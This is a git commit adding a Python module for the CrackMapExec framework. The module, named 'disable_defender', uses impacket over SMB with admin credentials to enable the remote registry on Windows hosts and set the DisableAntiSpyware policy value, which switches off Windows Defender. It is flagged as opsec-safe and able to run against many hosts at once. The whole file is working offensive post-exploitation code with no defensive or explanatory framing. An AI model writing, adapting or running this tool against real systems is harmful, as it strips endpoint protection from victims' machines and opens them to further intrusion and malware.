25fe6e7a78c083a36fb4f4bdcf2dba252e2e5252
luisotedomin <48179833+luisotedomin@users.noreply.github.com>
2023-06-04 18:50:23 +0200

    Add files via upload

---
+++ CME Disable AV v1.1.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# Author:
+# Luis Otero ( zero3xplo1it - @luisotedomin)
+
+from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.dcerpc.v5 import rrp
+from impacket.examples.secretsdump import RemoteOperations
+from sys import exit
+
+class CMEModule:
+
+    name = 'disable_defender'
+    description = 'Disables Windows Defender via SMB'
+    supported_protocols = ['smb']
+    opsec_safe = True
+    multiple_hosts = True
+
+    def options(self, context, module_options):
+        '''
+            No options required
+        '''
+    def on_admin_login(self, context, connection):
+        self.disable_defender(context, connection.conn)
+
+    def disable_defender(self, context, smbconnection):
+        remoteOps = RemoteOperations(smbconnection, False)
+        remoteOps.enableRegistry()
+
+        ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
+        regHandle = ans['phKey']
+
+        ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
+        keyHandle = ans['phkResult']
+
+        rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00',  rrp.REG_DWORD, 1)
+
+        rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00')
+
+        if int(data) == 1:
+            context.log.success('Windows Defender disabled successfully')
+
+        try:
+            remoteOps.finish()
+        except:
+            pass
+
+    
